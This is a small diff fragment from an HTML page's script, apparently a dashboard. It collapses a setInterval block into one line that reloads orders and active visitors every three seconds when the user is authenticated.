-    loadOrders();
-    loadActiveVisitors();
-  }
-}, 3000);
+setInterval(function(){if(AUTHED){loadOrders();loadActiveVisitors()}},3000);
 </script>
 </body>
 </html>
